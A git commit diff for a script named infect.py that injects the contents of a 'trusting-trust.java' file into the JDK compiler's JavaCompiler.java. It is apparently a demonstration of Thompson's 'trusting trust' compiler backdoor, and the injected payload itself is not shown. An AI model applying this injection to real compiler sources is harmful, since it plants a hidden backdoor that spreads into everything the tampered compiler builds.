87580267fdcb02843afd450a70e8a375a4231522
Elias Lundell <elilun03@gmail.com>
2025-02-07 17:02:09 +0100

    make python script read and then write

--- infect.py
+++ infect.py
@@ -3,18 +3,20 @@ import os
 dirname = os.path.dirname(os.path.abspath(__file__))
 target_path = os.path.join(dirname, 'src/jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java')
 
-def minify(s):
+def minify(s: str):
     out = ""
-    for line in s:
+    for line in s.split("\n"):
         out += line.strip()
-
     return out
 
 with open('trusting-trust.java', 'r') as f:
-    trusting_trust = minify(f)
+    trusting_trust_inner = f.read()
+
+trusting_trust = trusting_trust_inner
 
 with open(target_path, 'r') as f:
     content = f.read()
-    content = content.replace("return filename.getCharSequence(false);", trusting_trust)
-    f.write(content)
+    content = content.replace("return filename.getCharContent(false);", trusting_trust)
 
+with open(target_path, 'w') as f:
+    _ = f.write(content)
